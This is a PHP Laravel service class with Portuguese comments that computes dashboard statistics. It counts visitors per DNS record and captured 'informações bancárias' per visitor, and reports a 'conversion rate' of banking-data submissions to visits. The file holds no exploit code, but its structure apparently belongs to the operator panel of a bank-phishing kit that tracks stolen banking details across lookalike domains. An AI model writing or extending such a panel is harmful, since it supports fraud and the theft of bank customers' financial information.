<?php

namespace App\Services;

use App\Models\Bank;
use App\Models\Acesso;
use App\Models\DnsRecord;
use App\Models\Visitante;
use App\Models\InformacaoBancaria;
use Illuminate\Support\Facades\DB;

/**
 * Serviço para fornecer estatísticas e dados para o dashboard
 */
class DashboardService extends BaseService
{
    /**
     * Obtém estatísticas gerais de bancos de um usuário
     * 
     * @param int $userId ID do usuário
     * @return array Dados estatísticos dos bancos
     */
    public function getBankStats($userId)
    {
        $banks = Bank::where('usuario_id', $userId)->get();
        
        return [
            'total_banks' => $banks->count(),
            'active_banks' => $banks->where('status', 'ativo')->count(),
        ];
    }

    /**
     * Obtém atividades recentes de um usuário
     * 
     * @param int $userId ID do usuário
     * @param int $limit Número máximo de registros
     * @return array Atividades recentes
     */
    public function getRecentActivity($userId, $limit = 5)
    {
        return Acesso::where('usuario_id', $userId)
            ->orderBy('data_acesso', 'desc')
            ->take($limit)
            ->get()
            ->map(function($acesso) {
                return [
                    'tipo' => 'login',
                    'data' => $acesso->data_acesso,
                    'detalhes' => [
                        'ip' => $acesso->ip,
                        'user_agent' => $acesso->user_agent
                    ]
                ];
            });
    }
    
    /**
     * Obtém estatísticas completas do dashboard para um usuário
     * 
     * @param int $userId ID do usuário
     * @return array Todos os dados para o dashboard
     */
    public function getDashboardStats($userId)
    {
        $bankStats = $this->getBankStats($userId);
        $recentActivity = $this->getRecentActivity($userId);
        
        // Total de visitantes
        $totalVisitantes = Visitante::where('usuario_id', $userId)->count();
        
        // Total de informações bancárias
        $totalInformacoes = InformacaoBancaria::whereHas('visitante', function($query) use ($userId) {
            $query->where('usuario_id', $userId);
        })->count();
        
        // Taxa de conversão
        $taxaConversao = ($totalVisitantes > 0) ? 
            round(($totalInformacoes / $totalVisitantes) * 100, 2) : 0;
        
        // Top 5 DNS records
        $topDnsRecords = DB::table('dns_records')
            ->select(
                'dns_records.id',
                'dns_records.name',
                'dns_records.content',
                DB::raw('COUNT(visitantes.id) as total_acessos')
            )
            ->leftJoin('visitantes', 'dns_records.id', '=', 'visitantes.dns_record_id')
            ->where('dns_records.user_id', $userId)
            ->groupBy('dns_records.id', 'dns_records.name', 'dns_records.content')
            ->orderByDesc('total_acessos')
            ->limit(5)
            ->get();
        
        return [
            'estatisticas_gerais' => [
                'total_visitantes' => $totalVisitantes,
                'total_informacoes' => $totalInformacoes,
                'taxa_conversao' => $taxaConversao
            ],
            'estatisticas_bancos' => $bankStats,
            'top_dns_records' => $topDnsRecords,
            'atividades_recentes' => $recentActivity
        ];
    }
    
    /**
     * Obtém estatísticas filtradas por data para o dashboard
     * 
     * @param int $userId ID do usuário
     * @param string $dataInicio Data inicial
     * @param string $dataFim Data final
     * @return array Estatísticas filtradas
     */
    public function getFilteredStats($userId, $dataInicio, $dataFim)
    {
        // Total de visitantes no período
        $totalVisitantes = Visitante::where('usuario_id', $userId)
            ->whereBetween('created_at', [$dataInicio, $dataFim])
            ->count();
        
        // Total de informações bancárias no período
        $totalInformacoes = InformacaoBancaria::join('visitantes', 'informacoes_bancarias.visitante_uuid', '=', 'visitantes.uuid')
            ->where('visitantes.usuario_id', $userId)
            ->whereBetween('informacoes_bancarias.created_at', [$dataInicio, $dataFim])
            ->count();
        
        // Taxa de conversão no período
        $taxaConversao = ($totalVisitantes > 0) ? 
            round(($totalInformacoes / $totalVisitantes) * 100, 2) : 0;
        
        // Visitantes por dia no período
        $visitantesPorDia = Visitante::where('usuario_id', $userId)
            ->whereBetween('created_at', [$dataInicio, $dataFim])
            ->select(
                DB::raw($this->formatDate('%Y-%m-%d', 'created_at') . ' as data'),
                DB::raw('COUNT(*) as total')
            )
            ->groupBy('data')
            ->orderBy('data')
            ->get();
        
        // Informações bancárias por dia no período
        $informacoesPorDia = InformacaoBancaria::join('visitantes', 'informacoes_bancarias.visitante_uuid', '=', 'visitantes.uuid')
            ->where('visitantes.usuario_id', $userId)
            ->whereBetween('informacoes_bancarias.created_at', [$dataInicio, $dataFim])
            ->select(
                DB::raw($this->formatDate('%Y-%m-%d', 'informacoes_bancarias.created_at') . ' as data'),
                DB::raw('COUNT(*) as total')
            )
            ->groupBy('data')
            ->orderBy('data')
            ->get();
        
        // Top DNS records no período
        $topDnsRecords = DB::table('dns_records')
            ->select(
                'dns_records.id',
                'dns_records.name',
                'dns_records.content',
                DB::raw('COUNT(visitantes.id) as total_acessos')
            )
            ->leftJoin('visitantes', 'dns_records.id', '=', 'visitantes.dns_record_id')
            ->where('dns_records.user_id', $userId)
            ->whereBetween('visitantes.created_at', [$dataInicio, $dataFim])
            ->groupBy('dns_records.id', 'dns_records.name', 'dns_records.content')
            ->orderByDesc('total_acessos')
            ->limit(5)
            ->get();
            
        return [
            'total_visitantes' => $totalVisitantes,
            'total_informacoes' => $totalInformacoes,
            'taxa_conversao' => $taxaConversao,
            'visitantes_por_dia' => $visitantesPorDia,
            'informacoes_por_dia' => $informacoesPorDia,
            'top_dns_records' => $topDnsRecords,
            'periodo' => [
                'inicio' => $dataInicio,
                'fim' => $dataFim
            ]
        ];
    }
}
